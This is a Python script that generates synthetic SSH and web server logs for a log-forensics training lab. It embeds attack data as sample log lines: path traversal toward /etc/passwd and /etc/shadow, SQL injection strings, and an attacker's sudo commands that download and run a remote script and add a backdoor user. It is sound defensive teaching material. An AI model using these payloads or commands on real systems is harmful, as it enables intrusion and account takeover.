"""Generate auth.log and access.log for sec-01-log-forensics (deterministic, seed 1337).

The story (all on 2024-03-14, server web01, UTC):
  * normal staff SSH logins (alice, bob - bob mistypes his password twice)
  * 198.51.100.7  slow password guessing, one try every 15 minutes (below a 10-in-5-min alarm)
  * 192.0.2.99    fast brute force at 03:30, never gets in
  * 203.0.113.45  fast brute force at 03:58, then logs in as `deploy` and uses sudo
  * 198.51.100.23 web attacks from 04:10: path traversal and SQL injection
  * harmless look-alike requests (a blog post about "union jobs", O'Reilly books...)

Run:  python labs/sec-01-log-forensics/data/generate.py [--out DIR]
"""

from __future__ import annotations

import argparse
import random
from datetime import datetime, timedelta
from pathlib import Path

SEED = 1337
DAY = datetime(2024, 3, 14)
HOST = "web01"
UA_BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
UA_TOOL = "sqlmap/1.7.2#stable (https://sqlmap.org)"


def ts(dt: datetime) -> str:
    return dt.strftime("%b %d %H:%M:%S")


def build_auth(rng: random.Random) -> list[str]:
    ev: list[tuple[datetime, str]] = []
    pid = [2000]

    def sshd(dt, msg):
        pid[0] += rng.randint(1, 9)
        ev.append((dt, f"{ts(dt)} {HOST} sshd[{pid[0]}]: {msg}"))

    # background noise: cron every 30 minutes
    for m in range(0, 10 * 60, 30):
        dt = DAY + timedelta(hours=1, minutes=m)
        ev.append((dt, f"{ts(dt)} {HOST} CRON[{900 + m}]: pam_unix(cron:session): session opened for user root by (uid=0)"))

    # normal staff logins
    for h, user, ip in [(1, "alice", "10.0.4.21"), (7, "alice", "10.0.4.21"), (8, "bob", "10.0.4.30"),
                        (9, "carol", "10.0.4.44"), (10, "alice", "10.0.4.21")]:
        dt = DAY + timedelta(hours=h, minutes=rng.randint(0, 50), seconds=rng.randint(0, 59))
        if user == "bob":
            sshd(dt, f"Failed password for bob from {ip} port {rng.randint(40000, 60000)} ssh2")
            dt += timedelta(seconds=7)
            sshd(dt, f"Failed password for bob from {ip} port {rng.randint(40000, 60000)} ssh2")
            dt += timedelta(seconds=9)
            sshd(dt, f"Accepted password for bob from {ip} port {rng.randint(40000, 60000)} ssh2")
        else:
            sshd(dt, f"Accepted publickey for {user} from {ip} port {rng.randint(40000, 60000)} ssh2: "
                     f"ED25519 SHA256:{rng.getrandbits(64):016x}")
        sshd(dt + timedelta(seconds=1), f"pam_unix(sshd:session): session opened for user {user}(uid=100{len(user)}) by (uid=0)")

    # slow scanner: 8 tries, 15 minutes apart
    for i in range(8):
        dt = DAY + timedelta(hours=1, minutes=5 + 15 * i, seconds=rng.randint(0, 59))
        sshd(dt, f"Failed password for invalid user oracle from 198.51.100.7 port {rng.randint(40000, 60000)} ssh2")

    # fast brute force that fails
    dt = DAY + timedelta(hours=3, minutes=30)
    for i in range(14):
        dt += timedelta(seconds=rng.randint(5, 9))
        user = rng.choice(["admin", "test", "ubuntu"])
        sshd(dt, f"Failed password for invalid user {user} from 192.0.2.99 port {rng.randint(40000, 60000)} ssh2")
    sshd(dt + timedelta(seconds=2), f"Connection closed by 192.0.2.99 port {rng.randint(40000, 60000)} [preauth]")

    # brute force that succeeds
    dt = DAY + timedelta(hours=3, minutes=58)
    for i in range(46):
        dt += timedelta(seconds=rng.randint(3, 8))
        user = rng.choice(["root", "admin", "deploy", "git"])
        if user in ("root", "deploy"):
            sshd(dt, f"Failed password for {user} from 203.0.113.45 port {rng.randint(40000, 60000)} ssh2")
        else:
            sshd(dt, f"Failed password for invalid user {user} from 203.0.113.45 port {rng.randint(40000, 60000)} ssh2")
    comp = DAY + timedelta(hours=4, minutes=3, seconds=41)
    sshd(comp, f"Accepted password for deploy from 203.0.113.45 port 51990 ssh2")
    sshd(comp + timedelta(seconds=1), "pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)")
    for sec, cmd in [(89, "/usr/bin/wget http://203.0.113.45/x.sh -O /tmp/x.sh"),
                     (102, "/bin/bash /tmp/x.sh"),
                     (140, "/usr/sbin/useradd -m -s /bin/bash sysupdate")]:
        dt = comp + timedelta(seconds=sec)
        ev.append((dt, f"{ts(dt)} {HOST} sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND={cmd}"))
    # a normal sudo by alice later (not attacker activity)
    dt = DAY + timedelta(hours=10, minutes=55)
    ev.append((dt, f"{ts(dt)} {HOST} sudo:   alice : TTY=pts/1 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update"))

    ev.sort(key=lambda e: e[0])
    return [line for _, line in ev]


def clf(dt: datetime, ip: str, method: str, path: str, status: int, size: int, ua: str, ref: str = "-") -> str:
    return (f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S")} +0000] "{method} {path} HTTP/1.1" '
            f'{status} {size} "{ref}" "{ua}"')


NORMAL_PATHS = ["/", "/index.html", "/products?id={n}", "/static/app.js", "/static/style.css", "/api/cart",
                "/search?q=running+shoes", "/search?q=O%27Reilly+books", "/blog/how-to-select-the-best-union-jobs",
                "/docs/v1..v2-migration", "/search?q=rock+and+roll", "/download?file=reports/2024-q1.pdf"]

ATTACKS = [  # (seconds after 04:10:00, method, path, status, size)
    (2, "GET", "/download?file=../../../../etc/passwd", 200, 1873),
    (9, "GET", "/download?file=..%2F..%2F..%2Fetc%2Fshadow", 403, 162),
    (15, "GET", "/static/%2e%2e/%2e%2e/app/config.py", 404, 162),
    (21, "GET", "/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd", 400, 150),
    (64, "GET", "/products?id=1%27%20OR%20%271%27%3D%271", 200, 9921),
    (71, "GET", "/products?id=1+UNION+SELECT+username,password+FROM+users--", 500, 312),
    (80, "GET", "/search?q=test%27%3B+DROP+TABLE+orders%3B--", 500, 312),
    (95, "POST", "/login?user=admin%27--", 302, 0),
    (130, "GET", "/products?id=1+AND+SLEEP(5)", 200, 4410),
]


def build_access(rng: random.Random) -> list[str]:
    ev: list[tuple[datetime, str]] = []
    ips = [f"203.0.113.{n}" for n in (10, 11, 12, 200)] + ["10.0.4.21", "192.0.2.150"]
    start = DAY + timedelta(hours=3, minutes=50)
    for i in range(120):
        dt = start + timedelta(seconds=i * 17 + rng.randint(0, 9))
        path = rng.choice(NORMAL_PATHS).format(n=rng.randint(1, 60))
        status = 200 if rng.random() > 0.05 else 404
        ev.append((dt, clf(dt, rng.choice(ips), "GET", path, status, rng.randint(300, 20000), UA_BROWSER)))
    base = DAY + timedelta(hours=4, minutes=10)
    for sec, method, path, status, size in ATTACKS:
        dt = base + timedelta(seconds=sec)
        ev.append((dt, clf(dt, "198.51.100.23", method, path, status, size, UA_TOOL)))
    ev.sort(key=lambda e: e[0])
    return [line for _, line in ev]


def generate(out: Path) -> list[Path]:
    out.mkdir(parents=True, exist_ok=True)
    rng = random.Random(SEED)
    auth, access = out / "auth.log", out / "access.log"
    auth.write_text("\n".join(build_auth(rng)) + "\n", encoding="utf-8")
    access.write_text("\n".join(build_access(rng)) + "\n", encoding="utf-8")
    return [auth, access]


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--out", default=str(Path(__file__).resolve().parent))
    for f in generate(Path(ap.parse_args().out)):
        print(f"wrote {f}")
